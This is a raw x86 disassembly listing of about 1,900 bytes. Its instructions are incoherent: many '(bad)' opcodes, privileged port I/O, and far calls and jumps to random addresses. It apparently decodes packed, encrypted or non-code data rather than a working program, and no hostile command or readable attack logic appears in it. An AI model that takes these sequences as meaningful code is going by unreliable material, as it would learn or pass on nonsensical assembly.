  41cb9e:	or     ah,BYTE PTR [edi-0x38]
  41cba1:	adc    DWORD PTR [eax-0x3a3c49ba],ebx
  41cba7:	pop    edx
  41cba8:	xlat   BYTE PTR ds:[ebx]
  41cba9:	jmp    0xd997de9d
  41cbae:	jecxz  0x41cb7b
  41cbb0:	aaa    
  41cbb1:	inc    esi
  41cbb2:	(bad)  
  41cbb3:	in     al,0x5
  41cbb5:	or     eax,0xb418e396
  41cbba:	sbb    al,0xaa
  41cbbc:	ficomp DWORD PTR [esi+0x4b38c1be]
  41cbc2:	mov    ch,0xe4
  41cbc4:	std    
  41cbc5:	sbb    ecx,DWORD PTR [ebx-0x50]
  41cbc8:	pop    ds
  41cbc9:	fistp  QWORD PTR [ebx+0x172efa7c]
  41cbcf:	push   ss
  41cbd0:	mov    ds,edi
  41cbd2:	and    al,BYTE PTR [ebp-0x17e53ff0]
  41cbd8:	pop    esp
  41cbd9:	ss mov eax,0x4e9ad73f
  41cbdf:	xor    dh,ah
  41cbe1:	pop    ebx
  41cbe2:	in     al,0xb8
  41cbe4:	sbb    eax,esp
  41cbe6:	jns    0x41cb81
  41cbe8:	ins    BYTE PTR es:[edi],dx
  41cbe9:	mov    edi,DWORD PTR [ebx-0x35]
  41cbec:	pop    ds
  41cbed:	dec    esp
  41cbee:	mov    ds:0x70d222fd,al
  41cbf3:	push   DWORD PTR [edx]
  41cbf5:	mov    edx,0x1de76a46
  41cbfa:	retf   
  41cbfb:	adc    eax,0xca4695ad
  41cc00:	jmp    0xed71:0x35942a5
  41cc07:	push   ebx
  41cc08:	xor    bl,BYTE PTR [ecx]
  41cc0a:	adc    al,0x73
  41cc0c:	loop   0x41cbf2
  41cc0e:	sahf   
  41cc0f:	push   ebp
  41cc10:	add    DWORD PTR [esi-0x34],ebx
  41cc13:	(bad)  
  41cc14:	jb     0x41cc48
  41cc16:	dec    ebx
  41cc17:	enter  0xce68,0xe1
  41cc1b:	jle    0x41cbfe
  41cc1d:	js     0x41cc0c
  41cc1f:	mov    ds:0x25572970,eax
  41cc24:	pop    ds
  41cc25:	sbb    DWORD PTR [eax],0x6332dc04
  41cc2b:	lea    edx,[esi]
  41cc2d:	leave  
  41cc2e:	mov    cl,0x73
  41cc30:	fwait
  41cc31:	repnz add ah,bh
  41cc34:	dec    ecx
  41cc35:	outs   dx,DWORD PTR ds:[esi]
  41cc36:	add    eax,0x1286ef93
  41cc3b:	fist   DWORD PTR [edi+ebx*8-0x18559f2e]
  41cc42:	rcr    BYTE PTR [esi+0x476b5548],1
  41cc48:	rcl    BYTE PTR [ecx],1
  41cc4a:	adc    DWORD PTR [esi],ecx
  41cc4c:	inc    esi
  41cc4d:	jmp    0xa45c6261
  41cc52:	cmp    dl,BYTE PTR [eax-0x1e2e9e32]
  41cc58:	(bad)
  41cc5b:	test   BYTE PTR [ecx-0x51716b66],cl
  41cc61:	xchg   esi,eax
  41cc62:	loopne 0x41cca4
  41cc64:	in     al,dx
  41cc65:	fsub   DWORD PTR [eax+ebx*4-0x35]
  41cc69:	push   ebp
  41cc6a:	arpl   di,sp
  41cc6c:	sbb    eax,0xd2558979
  41cc71:	js     0x41cc6e
  41cc73:	adc    DWORD PTR [ebp+0x4c27fcd0],ebx
  41cc79:	jnp    0x41cc4a
  41cc7b:	pop    es
  41cc7c:	fcmovnbe st,st(4)
  41cc7e:	pushf  
  41cc7f:	daa    
  41cc80:	ss aas 
  41cc82:	push   ds
  41cc83:	mov    al,0xd4
  41cc85:	ret    0x8981
  41cc88:	loope  0x41cc3c
  41cc8a:	adc    ecx,DWORD PTR [ebx]
  41cc8c:	ret    0x98b4
  41cc8f:	inc    edx
  41cc90:	push   es
  41cc91:	sbb    al,BYTE PTR [ebp+0x7af54b5d]
  41cc97:	in     eax,0xe
  41cc99:	jbe    0x41ccf0
  41cc9b:	sub    ebx,ecx
  41cc9d:	stos   DWORD PTR es:[edi],eax
  41cc9e:	in     al,0x8e
  41cca0:	push   0xfffffffc
  41cca2:	dec    ebp
  41cca3:	add    edx,esi
  41cca5:	retf   0x2419
  41cca8:	or     bl,dl
  41ccaa:	fwait
  41ccab:	or     ah,ch
  41ccad:	les    ebp,FWORD PTR [ebp-0x71]
  41ccb0:	pmuludq mm3,QWORD PTR [ebx-0x62]
  41ccb4:	das    
  41ccb5:	addr16 mov eax,0xe19b8324
  41ccbb:	xchg   ebp,eax
  41ccbc:	sbb    DWORD PTR [eax+0x48],esp
  41ccbf:	sbb    al,0xd5
  41ccc1:	adc    al,0x6e
  41ccc3:	mov    esp,0x7ad1d5ee
  41ccc8:	iret   
  41ccc9:	sub    DWORD PTR [esp+eiz*2+0x61587bb7],eax
  41ccd0:	jle    0x41cd25
  41ccd2:	into   
  41ccd3:	mov    eax,ds:0xd56516bc
  41ccd8:	xchg   esp,eax
  41ccd9:	xor    bl,BYTE PTR [edx+0x4f530527]
  41ccdf:	sub    eax,0x46c9ff79
  41cce4:	aas    
  41cce5:	cmp    bh,bl
  41cce7:	hlt    
  41cce8:	test   DWORD PTR [edi-0x20],ebp
  41cceb:	ret    
  41ccec:	loope  0x41cc9a
  41ccee:	or     eax,0xc4f29d6e
  41ccf3:	add    dh,BYTE PTR [ecx-0xcee0505]
  41ccf9:	sahf   
  41ccfa:	loope  0x41ccdf
  41ccfc:	pushf  
  41ccfd:	and    ch,BYTE PTR [si-0x68]
  41cd01:	ror    DWORD PTR [ecx+0x43683ea0],cl
  41cd07:	xchg   edi,eax
  41cd08:	sbb    ebp,DWORD PTR [eax+0x77852dc0]
  41cd0e:	jecxz  0x41ccfa
  41cd10:	mov    al,ds:0x8f9e02e1
  41cd15:	loop   0x41ccce
  41cd17:	scas   eax,DWORD PTR es:[edi]
  41cd18:	xor    eax,0xc63edea8
  41cd1d:	add    ah,BYTE PTR ds:0x1fc74f2a
  41cd23:	sub    eax,0xc21aaa61
  41cd28:	mov    BYTE PTR [esi-0x3e51a49a],bl
  41cd2e:	popa   
  41cd2f:	ja     0x41cd4f
  41cd31:	adc    BYTE PTR [ecx],bh
  41cd33:	inc    ebx
  41cd34:	arpl   WORD PTR [edi-0x7e22e656],ax
  41cd3a:	mov    esp,ds
  41cd3c:	jecxz  0x41cd17
  41cd3e:	xchg   ecx,eax
  41cd3f:	add    ch,ch
  41cd41:	xor    al,0x3b
  41cd43:	jns    0x41ccef
  41cd45:	repnz cwde 
  41cd47:	movlps xmm3,QWORD PTR [ecx+0x1c70c6fb]
  41cd4e:	test   DWORD PTR [ecx+eiz*1+0x6077b0bf],eax
  41cd55:	mov    eax,ds:0xd497ea23
  41cd5a:	jo     0x41cd88
  41cd5c:	adc    BYTE PTR [ecx+edx*2-0x45],cl
  41cd60:	imul   eax,DWORD PTR [ecx],0x159beead
  41cd66:	cld    
  41cd67:	sub    al,0xa
  41cd69:	aaa    
  41cd6a:	cmp    BYTE PTR [eax-0x1b87b95c],ah
  41cd70:	mov    ds:0xb344280,eax
  41cd75:	lds    edx,FWORD PTR [ebx+0x582687bf]
  41cd7b:	mov    esp,0x45aa2895
  41cd80:	nop
  41cd81:	ins    DWORD PTR es:[edi],dx
  41cd82:	add    bl,0x2a
  41cd85:	in     eax,dx
  41cd86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd87:	js     0x41cdc0
  41cd89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd8a:	imul   ecx,DWORD PTR [edx-0x78],0xffffffe8
  41cd8e:	imul   edi,DWORD PTR [ebx],0x223cf77
  41cd94:	dec    eax
  41cd95:	push   esp
  41cd96:	mov    DWORD PTR [edx],0xe2c0fc21
  41cd9c:	add    eax,0x6bc97706
  41cda1:	not    BYTE PTR [ebp+0x2c]
  41cda4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cda5:	pop    eax
  41cda6:	sbb    BYTE PTR [ebx-0x55041546],bl
  41cdac:	fisttp DWORD PTR [ebx+0x13]
  41cdaf:	push   esp
  41cdb0:	test   DWORD PTR [edx-0x5acb0aac],0xd602aa85
  41cdba:	int    0x62
  41cdbc:	mov    gs,WORD PTR [edx-0x75503147]
  41cdc2:	adc    eax,0xdf03feb5
  41cdc7:	add    esi,DWORD PTR [esi+0x60]
  41cdca:	mov    bh,0xe
  41cdcc:	cmp    ecx,0x15
  41cdcf:	ins    DWORD PTR es:[edi],dx
  41cdd0:	sbb    eax,0xcb42984f
  41cdd5:	mov    bl,0xee
  41cdd7:	push   ds
  41cdd8:	add    al,0x97
  41cdda:	shl    dl,cl
  41cddc:	push   0xe5623de7
  41cde1:	xor    ah,al
  41cde3:	dec    DWORD PTR [ebp+0x69794a9a]
  41cde9:	or     bh,bh
  41cdeb:	adc    BYTE PTR [eax],0xed
  41cdee:	jae    0x41cd73
  41cdf0:	loop   0x41cd9a
  41cdf2:	xchg   ebp,eax
  41cdf3:	shl    esi,cl
  41cdf5:	adc    eax,0x9be6e198
  41cdfa:	icebp  
  41cdfb:	inc    eax
  41cdfc:	inc    esi
  41cdfd:	pusha  
  41cdfe:	imul   ebp,DWORD PTR [edi-0x24],0xa0405de9
  41ce05:	adc    al,0x34
  41ce07:	ja     0x41ce2d
  41ce09:	int3   
  41ce0a:	rcr    BYTE PTR [eax],1
  41ce0c:	sbb    eax,0xefb3d81f
  41ce11:	int3   
  41ce12:	sub    eax,0xd987ea5
  41ce17:	test   DWORD PTR ds:0x533baf5e,ebp
  41ce1d:	not    BYTE PTR [ebx+0x26]
  41ce20:	fild   QWORD PTR [edx-0x1f5ba1cd]
  41ce26:	pop    eax
  41ce27:	mov    al,ds:0xc0d2861e
  41ce2c:	sbb    bl,BYTE PTR [edx]
  41ce2e:	(bad)
  41ce31:	mov    ecx,0x830bfbb1
  41ce36:	mov    ebx,0x1a547efb
  41ce3b:	retf   
  41ce3c:	jae    0x41ce56
  41ce3e:	lock loop 0x41cea6
  41ce41:	out    dx,eax
  41ce42:	xchg   ebp,eax
  41ce43:	mov    edx,0x54cdc4f2
  41ce48:	fmul   st(4),st
  41ce4a:	mov    WORD PTR [eax-0x7e3b0775],es
  41ce50:	dec    ebp
  41ce51:	pop    ds
  41ce52:	xchg   edx,eax
  41ce53:	sub    ecx,ecx
  41ce55:	xchg   edi,eax
  41ce56:	push   cs
  41ce57:	pop    edi
  41ce58:	xor    cl,BYTE PTR [eax+0x76]
  41ce5b:	jmp    0x41ce49
  41ce5d:	push   edi
  41ce5e:	lds    eax,FWORD PTR ds:0x7cfd861
  41ce64:	mov    DWORD PTR [edi+0x612f0f1],esp
  41ce6a:	mov    cl,0xaf
  41ce6c:	addr16 push edx
  41ce6e:	mov    dl,0x7e
  41ce70:	mov    ecx,0xb381adc5
  41ce75:	and    edx,ecx
  41ce77:	out    0x77,al
  41ce79:	add    al,0xdd
  41ce7b:	loop   0x41ce93
  41ce7d:	add    eax,edx
  41ce7f:	pop    esi
  41ce80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce81:	test   ebx,esp
  41ce83:	js     0x41ce12
  41ce85:	fstp   TBYTE PTR [edx-0x47962314]
  41ce8b:	(bad)  
  41ce8c:	int3   
  41ce8d:	popa   
  41ce8e:	jb     0x41ce7e
  41ce90:	inc    edi
  41ce91:	sbb    ecx,DWORD PTR [edx+0x56]
  41ce94:	fwait
  41ce95:	sbb    BYTE PTR [ebp-0x80],0x57
  41ce99:	(bad)  
  41ce9a:	ds lahf 
  41ce9c:	jg     0x41cee2
  41ce9e:	ins    BYTE PTR es:[edi],dx
  41ce9f:	lds    edi,FWORD PTR [esi-0x17]
  41cea2:	mov    esi,0xe028fde1
  41cea7:	into   
  41cea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cea9:	xchg   edi,eax
  41ceaa:	call   0x3e13:0xb010ed06
  41ceb1:	fcmovu st,st(4)
  41ceb3:	mov    ecx,0xb7655ab8
  41ceb8:	imul   eax,ebx,0x523b8db0
  41cebe:	clc    
  41cebf:	popf   
  41cec0:	push   ss
  41cec1:	pop    ebp
  41cec2:	cdq    
  41cec3:	ins    BYTE PTR es:[edi],dx
  41cec4:	cmp    dl,cl
  41cec6:	popf   
  41cec7:	sbb    al,0xcf
  41cec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ceca:	jnp    0x41cee3
  41cecc:	mov    ds:0xccdd99d8,eax
  41ced1:	and    eax,0xf5e188f1
  41ced6:	fsubr  QWORD PTR [edi]
  41ced8:	test   dh,bh
  41ceda:	jns    0x41ce96
  41cedc:	out    dx,eax
  41cedd:	daa    
  41cede:	lods   eax,DWORD PTR ds:[esi]
  41cedf:	mov    ah,0xdb
  41cee1:	dec    edx
  41cee2:	mov    dl,0xfa
  41cee4:	mov    dl,0x15
  41cee6:	xchg   esp,eax
  41cee7:	test   DWORD PTR [eax],esp
  41cee9:	jnp    0x41cf66
  41ceeb:	imul   eax,edx,0xffffffb1
  41ceee:	mov    esp,0xb8273d21
  41cef3:	lahf   
  41cef4:	sub    DWORD PTR [eax+edi*1-0x3eda54b6],edx
  41cefb:	pop    ebx
  41cefc:	bnd call 0x69ac800d
  41cf02:	mov    bh,0x9c
  41cf04:	enter  0x33d3,0x68
  41cf08:	or     DWORD PTR [edi+0x602b69a5],esi
  41cf0e:	pop    edi
  41cf0f:	(bad)  
  41cf10:	mov    ecx,0x2b79ea4f
  41cf15:	sub    esp,DWORD PTR [esi+0x3d33aaaf]
  41cf1b:	push   esi
  41cf1c:	lods   eax,DWORD PTR ds:[esi]
  41cf1d:	pop    eax
  41cf1e:	sub    al,BYTE PTR [edi-0x69a49fcf]
  41cf24:	sbb    DWORD PTR [ebp-0x17e6193a],ebp
  41cf2a:	aas    
  41cf2b:	fsubr  DWORD PTR [ebp+0x28b71da3]
  41cf31:	cmp    bh,BYTE PTR [ecx+edx*1]
  41cf34:	popa   
  41cf35:	sub    BYTE PTR ds:0xe2345987,bl
  41cf3b:	mov    eax,DWORD PTR [edi+0x51]
  41cf3e:	repnz push es
  41cf40:	mov    edx,0x3ce0d612
  41cf45:	or     BYTE PTR [ebp-0x63cd7d78],dh
  41cf4b:	add    bh,BYTE PTR [esi]
  41cf4d:	mov    fs,WORD PTR [edx+0x3154cb9d]
  41cf53:	xchg   ecx,eax
  41cf54:	jno    0x827e74d
  41cf5a:	or     eax,ecx
  41cf5c:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41cf5e:	cdq    
  41cf5f:	mov    eax,0xf416ca7e
  41cf64:	retf   0x7ac2
  41cf67:	shl    DWORD PTR [edi],1
  41cf69:	mov    bh,0x48
  41cf6b:	pop    esi
  41cf6c:	test   al,0x96
  41cf6e:	cmp    DWORD PTR [ebx+0x3e],edi
  41cf71:	gs out dx,eax
  41cf73:	(bad)  
  41cf74:	(bad)  
  41cf75:	mov    ecx,0x6e75cb8a
  41cf7a:	fwait
  41cf7b:	dec    ebp
  41cf7c:	fwait
  41cf7d:	jb     0x41cfcb
  41cf7f:	fwait
  41cf80:	mov    cl,0x8e
  41cf82:	lock mov al,0x8d
  41cf85:	ss je  0x41cf93
  41cf88:	pop    eax
  41cf89:	adc    ah,al
  41cf8b:	sub    ebx,DWORD PTR [ebx-0x9]
  41cf8e:	fiadd  WORD PTR [ecx]
  41cf90:	mov    edx,esi
  41cf92:	lods   eax,DWORD PTR ds:[esi]
  41cf93:	call   0xa68:0x5833ecd3
  41cf9a:	xlat   BYTE PTR ds:[ebx]
  41cf9b:	mov    esp,ss
  41cf9d:	jbe    0x41cf4d
  41cf9f:	dec    ebx
  41cfa0:	mov    bl,0xf3
  41cfa2:	shr    BYTE PTR [esi+0x613a92c9],1
  41cfa8:	mov    eax,0xba84964f
  41cfad:	out    dx,al
  41cfae:	pop    es
  41cfaf:	xor    al,0x67
  41cfb1:	sub    al,0x7
  41cfb3:	sbb    eax,0xb5e56ea7
  41cfb8:	xchg   ecx,eax
  41cfb9:	adc    DWORD PTR [eax-0x6],ecx
  41cfbc:	pop    ebx
  41cfbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfbe:	sub    DWORD PTR [ecx+esi*8+0x6c],eax
  41cfc2:	mov    eax,0xe704b5b7
  41cfc7:	out    0xcc,eax
  41cfc9:	test   eax,0xb54bb0c5
  41cfce:	push   eax
  41cfcf:	daa    
  41cfd0:	adc    eax,0x85d23762
  41cfd5:	int    0x15
  41cfd7:	repz sti 
  41cfd9:	mov    dh,0x52
  41cfdb:	shl    BYTE PTR [edi+0x81f127],0x36
  41cfe2:	xchg   DWORD PTR [ebx+0x68720256],esp
  41cfe8:	in     al,0xb5
  41cfea:	sbb    BYTE PTR [esi+eiz*4],bl
  41cfed:	add    BYTE PTR [esi],dl
  41cfef:	sub    ebp,DWORD PTR [ebx]
  41cff1:	outs   dx,BYTE PTR ds:[esi]
  41cff2:	mov    ebx,DWORD PTR [ebp-0x38]
  41cff5:	mov    ds:0x90a480f9,eax
  41cffa:	push   ss
  41cffb:	ss (bad) 
  41cffe:	pop    edx
  41cfff:	stos   DWORD PTR es:[edi],eax
  41d000:	xor    BYTE PTR [eax],0xc1
  41d003:	pop    edi
  41d004:	(bad)  
  41d007:	mov    ebx,ebx
  41d009:	stc    
  41d00a:	adc    al,BYTE PTR [edi-0x57]
  41d00d:	add    eax,eax
  41d00f:	mov    edx,0xc0be13e4
  41d014:	cdq    
  41d015:	icebp  
  41d016:	es cli 
  41d018:	lea    edx,[eax]
  41d01a:	mov    ebp,0xa87cd431
  41d01f:	fisubr DWORD PTR [edx-0x35d8b6e2]
  41d025:	ret    0xe5d6
  41d028:	sbb    dl,BYTE PTR [eax]
  41d02a:	or     eax,0x7a3f1a40
  41d02f:	cmp    bl,BYTE PTR [bp+si]
  41d032:	pop    edx
  41d033:	lock xor eax,0x8adeb70c
  41d039:	cmc    
  41d03a:	cmc    
  41d03b:	jle    0x41d050
  41d03d:	xor    al,0xe0
  41d03f:	out    0x9d,al
  41d041:	lea    esi,[edx+0x62]
  41d044:	sub    cl,BYTE PTR [edi+eax*1-0x40]
  41d048:	ret    0x2751
  41d04b:	mov    ds:0x82efa7b5,eax
  41d050:	std    
  41d051:	into   
  41d052:	mov    ds:0xf8e7108b,al
  41d057:	int    0x81
  41d059:	dec    eax
  41d05a:	mov    esp,0xe5651902
  41d05f:	iret   
  41d060:	daa    
  41d061:	inc    edi
  41d062:	pop    eax
  41d063:	sbb    al,0x5d
  41d065:	ins    DWORD PTR es:[edi],dx
  41d066:	loopne 0x41d090
  41d068:	(bad)  ds:0xaa08410a
  41d06e:	and    DWORD PTR [esi-0x2e],esp
  41d071:	push   edx
  41d072:	aad    0x71
  41d074:	mov    edi,DWORD PTR [edx-0x63ed2d59]
  41d07a:	fistp  QWORD PTR [ecx-0x66]
  41d07d:	and    BYTE PTR [edx],bl
  41d07f:	dec    eax
  41d080:	mov    ecx,0xa4bd417f
  41d085:	or     edi,eax
  41d087:	pop    ds
  41d088:	lods   al,BYTE PTR ds:[esi]
  41d089:	retf   
  41d08a:	or     DWORD PTR [ecx+0x99a81ee],ebx
  41d090:	xchg   ebp,eax
  41d091:	or     BYTE PTR cs:[ebp-0x60a9d455],bh
  41d098:	or     DWORD PTR [edx],edx
  41d09a:	ret    
  41d09b:	stc    
  41d09c:	mov    dl,0xa2
  41d09e:	ins    DWORD PTR es:[edi],dx
  41d09f:	loop   0x41d0a0
  41d0a1:	sbb    DWORD PTR [ebx-0x15],ebp
  41d0a4:	adc    edx,0x7e
  41d0a7:	xchg   dl,dl
  41d0a9:	add    eax,0xd3dbbed4
  41d0ae:	mov    al,ds:0xf7b278ac
  41d0b3:	sbb    al,0x3c
  41d0b5:	in     al,dx
  41d0b6:	aad    0xc7
  41d0b8:	inc    edx
  41d0b9:	jg     0x41d132
  41d0bb:	shl    ch,cl
  41d0bd:	outs   dx,BYTE PTR ds:[esi]
  41d0be:	je     0x41d06f
  41d0c0:	fs repnz enter 0xa784,0xc
  41d0c6:	sar    BYTE PTR [ebp+0x2a5e4053],0xbc
  41d0cd:	cld    
  41d0ce:	arpl   WORD PTR [edx],si
  41d0d0:	mov    cl,0xfc
  41d0d2:	adc    ch,BYTE PTR [eax]
  41d0d4:	cld    
  41d0d5:	push   edi
  41d0d6:	icebp  
  41d0d7:	imul   ebx,DWORD PTR [ecx+0x202855cf],0xd6405b7
  41d0e1:	jge    0x41d0f6
  41d0e3:	jne    0x41d0fa
  41d0e5:	mov    cl,0x2c
  41d0e7:	loopne 0x41d11f
  41d0e9:	push   ds
  41d0ea:	cmp    al,0x97
  41d0ec:	out    0xaa,eax
  41d0ee:	cwde   
  41d0ef:	pop    ebx
  41d0f0:	xchg   ecx,eax
  41d0f1:	ror    BYTE PTR [esi+eax*4],cl
  41d0f4:	mov    WORD PTR [edi+0x63],es
  41d0f7:	jo     0x41d145
  41d0f9:	pop    ebx
  41d0fa:	or     esp,DWORD PTR [eax+ebx*2]
  41d0fd:	shl    DWORD PTR [ebx+0x5d],1
  41d100:	popf   
  41d101:	and    dh,bl
  41d103:	dec    dl
  41d105:	add    al,0x12
  41d107:	cmp    BYTE PTR ds:0xe657a8d4,ch
  41d10d:	outs   dx,DWORD PTR ds:[esi]
  41d10e:	jge    0x41d129
  41d110:	and    DWORD PTR [eax],0x9e2c76e7
  41d116:	fcomp  st(4)
  41d118:	inc    esi
  41d119:	mov    ah,0xe0
  41d11b:	xor    ebp,ebp
  41d11d:	test   eax,0x4ba939e6
  41d122:	or     dl,BYTE PTR [ebp-0x61]
  41d125:	push   edi
  41d126:	xchg   edi,eax
  41d127:	xchg   esi,eax
  41d128:	ss int3 
  41d12a:	cmc    
  41d12b:	out    dx,eax
  41d12c:	sub    BYTE PTR [ebp-0x26],cl
  41d12f:	loope  0x41d19f
  41d131:	rcl    dl,1
  41d133:	cdq    
  41d134:	mov    bl,0x75
  41d136:	sbb    eax,DWORD PTR [ebp+0x4e]
  41d139:	jg     0x41d0ea
  41d13b:	daa    
  41d13c:	xchg   ebx,eax
  41d13d:	xchg   BYTE PTR [ebx],bl
  41d13f:	push   esp
  41d140:	repz and BYTE PTR [ebx+0x7b],ah
  41d144:	mov    esi,0x381202a8
  41d149:	push   edx
  41d14a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d14b:	adc    eax,0xc4b4b54b
  41d150:	fld    TBYTE PTR [edi-0x620ed2af]
  41d156:	test   BYTE PTR [ebp+eax*4+0x59406a38],ch
  41d15d:	hlt    
  41d15e:	or     BYTE PTR [edi+0x66],ah
  41d161:	sahf   
  41d162:	inc    ah
  41d164:	mov    al,ds:0xbdcabc2a
  41d169:	stos   DWORD PTR es:[edi],eax
  41d16a:	cmp    al,bl
  41d16c:	(bad)  
  41d16d:	icebp  
  41d16e:	sub    ebp,DWORD PTR [ebx]
  41d170:	out    dx,eax
  41d171:	pop    eax
  41d172:	mov    bl,0x5f
  41d174:	and    DWORD PTR [ecx],edi
  41d176:	mov    ecx,0xbf25d516
  41d17b:	test   eax,0xcd620f88
  41d180:	add    al,0x89
  41d182:	fdiv   QWORD PTR [eax+0x6a]
  41d185:	ss jae 0x41d1c9
  41d188:	cmc    
  41d189:	scas   al,BYTE PTR es:[edi]
  41d18a:	(bad)  
  41d18b:	in     eax,dx
  41d18c:	cld    
  41d18d:	fsubr  DWORD PTR [ebp-0x7f]
  41d190:	cmp    al,BYTE PTR [edi+0x66]
  41d193:	push   edx
  41d194:	out    dx,eax
  41d195:	sti    
  41d196:	cmc    
  41d197:	lea    ecx,ds:0x3620e23b
  41d19d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d19e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d19f:	shl    al,cl
  41d1a1:	icebp  
  41d1a2:	and    BYTE PTR [ecx+0x6e],ch
  41d1a5:	lods   al,BYTE PTR ds:[esi]
  41d1a6:	mov    bh,0x34
  41d1a8:	jle    0x41d17b
  41d1aa:	jb     0x41d1da
  41d1ac:	aam    0x1a
  41d1ae:	sbb    eax,0xf632b52a
  41d1b3:	dec    edi
  41d1b4:	and    ecx,DWORD PTR [edx-0x4b8813f8]
  41d1ba:	pop    ss
  41d1bb:	imul   eax,ebx,0x1f
  41d1be:	pop    esi
  41d1bf:	push   ebx
  41d1c0:	imul   BYTE PTR [ecx]
  41d1c2:	stos   DWORD PTR es:[edi],eax
  41d1c3:	clc    
  41d1c4:	cmp    al,0x18
  41d1c6:	out    0xaa,al
  41d1c8:	es loop 0x41d162
  41d1cb:	aaa    
  41d1cc:	mov    dl,BYTE PTR [edx+esi*8+0x5a]
  41d1d0:	push   es
  41d1d1:	(bad)  
  41d1d2:	dec    esp
  41d1d3:	gs xchg edx,eax
  41d1d5:	(bad)  
  41d1d6:	pop    ds
  41d1d7:	sub    al,BYTE PTR [esi]
  41d1d9:	jmp    DWORD PTR [ecx]
  41d1db:	call   0xe0cd:0xf4d8f4c4
  41d1e2:	ds jno 0x41d19b
  41d1e5:	adc    al,0x7c
  41d1e7:	or     BYTE PTR [edi+0x78],0xcb
  41d1eb:	std    
  41d1ec:	cwde   
  41d1ed:	adc    esi,DWORD PTR [ecx-0x11]
  41d1f0:	sbb    BYTE PTR [bp+di-0x73],ah
  41d1f4:	push   ss
  41d1f5:	inc    esp
  41d1f6:	adc    al,0x52
  41d1f8:	mov    eax,ds:0x7e0f1e51
  41d1fd:	dec    edx
  41d1fe:	iret   
  41d1ff:	leave  
  41d200:	outs   dx,BYTE PTR ds:[esi]
  41d201:	call   0x5fad:0xf6657cdc
  41d208:	aad    0x66
  41d20a:	xor    ebp,ecx
  41d20c:	je     0x41d1cb
  41d20e:	mov    ebx,0xf9076b3c
  41d213:	push   edi
  41d214:	adc    DWORD PTR [ecx],0xffffff95
  41d217:	int    0x67
  41d219:	lods   eax,DWORD PTR ds:[esi]
  41d21a:	fiadd  WORD PTR [eax-0x539b14ff]
  41d220:	jle    0x41d249
  41d222:	cmc    
  41d223:	cmp    DWORD PTR [eax+0x4],edx
  41d226:	or     edx,ecx
  41d228:	lods   eax,DWORD PTR ds:[esi]
  41d229:	and    BYTE PTR [esi],bl
  41d22b:	fild   QWORD PTR [edi]
  41d22d:	(bad)  
  41d22e:	mov    ecx,DWORD PTR [ecx+0x6f9f5d8f]
  41d234:	fninit 
  41d236:	jge    0x41d296
  41d238:	adc    BYTE PTR [esi-0x6fab40cc],bh
  41d23e:	mov    ebp,0x69258a10
  41d243:	das    
  41d244:	cmp    bh,dh
  41d246:	adc    eax,0xb126835b
  41d24b:	inc    eax
  41d24c:	push   ss
  41d24d:	test   BYTE PTR [edx-0x7],ch
  41d250:	mov    esp,0xaf178a5
  41d255:	dec    edi
  41d256:	push   eax
  41d257:	fst    st(4)
  41d259:	cmp    esi,ecx
  41d25b:	cmp    al,0x98
  41d25d:	mov    cl,0xe3
  41d25f:	dec    ebp
  41d260:	xchg   edx,eax
  41d261:	xchg   edi,eax
  41d262:	jle    0x41d24f
  41d264:	and    edi,ecx
  41d266:	sbb    esp,DWORD PTR [edi+0xd]
  41d269:	pop    ecx
  41d26a:	int3   
  41d26b:	rcr    BYTE PTR [eax],0xa4
  41d26e:	xchg   esp,eax
  41d26f:	jae    0x41d25e
  41d271:	push   edx
  41d272:	jge    0x41d270
  41d274:	shr    DWORD PTR [ebx],cl
  41d276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d277:	ret    0xd242
  41d27a:	xor    BYTE PTR [edx+ebp*2],bl
  41d27d:	shl    BYTE PTR [ebx],cl
  41d27f:	enter  0x4ddb,0xc
  41d283:	xor    ax,0x9cae
  41d287:	sub    al,0x3c
  41d289:	cmc    
  41d28a:	adc    ch,ah
  41d28c:	sti    
  41d28d:	loopne 0x41d24a
  41d28f:	je     0x41d289
  41d291:	jbe    0x41d2f2
  41d293:	ss in  al,0x59
  41d296:	call   0xca7f95f8
  41d29b:	std    
  41d29c:	pop    ebx
  41d29d:	daa    
  41d29e:	xchg   edx,eax
  41d29f:	push   0x9b871e4f
  41d2a4:	mov    esp,DWORD PTR [esi+ebp*8+0x52]
  41d2a8:	mov    bl,0xb1
  41d2aa:	jo     0x41d2a3
  41d2ac:	es clc 
  41d2ae:	mov    edi,0xb305102d
  41d2b3:	cmp    DWORD PTR [eax],eax
  41d2b5:	sub    al,0x8a
  41d2b7:	stos   BYTE PTR es:[edi],al
  41d2b8:	stc    
  41d2b9:	minps  xmm6,XMMWORD PTR [ebx-0x4565ea54]
  41d2c0:	or     eax,0x6335e2e5
  41d2c5:	mov    bh,0xec
  41d2c7:	repz ss sbb eax,0x7b7ebc53
  41d2ce:	ins    DWORD PTR es:[edi],dx
  41d2cf:	ret    0x8f94
  41d2d2:	xor    BYTE PTR [edi-0x67f519e2],0x9e
  41d2d9:	add    eax,0xa5b95b06
  41d2de:	jno    0x41d2e0
  41d2e0:	je     0x41d27e
  41d2e2:	adc    al,0xb9
  41d2e4:	inc    esi
  41d2e5:	ja     0x41d342
  41d2e7:	xchg   ebx,eax
  41d2e8:	jmp    DWORD PTR [edi+ebp*8-0x1e]
  41d2ec:	loopne 0x41d287
  41d2ee:	sbb    dl,BYTE PTR [ecx]
  41d2f0:	and    DWORD PTR [ecx],0x8
  41d2f3:	sub    DWORD PTR [esi+0x2a],edx
  41d2f6:	mov    ecx,0x2aa59503
  41d2fb:	leave  
  41d2fc:	push   edx
  41d2fd:	dec    esp
  41d2fe:	in     al,0x5e
  41d300:	xor    al,0xda
  41d302:	in     al,dx
  41d303:	jnp    0x41d2a0
  41d305:	or     esi,edi
  41d307:	jne    0x41d32b
  41d309:	push   eax
  41d30a:	loop   0x41d2d6
  41d30c:	pop    ebp
  41d30d:	adc    bh,bh
  41d30f:	rcr    cl,cl
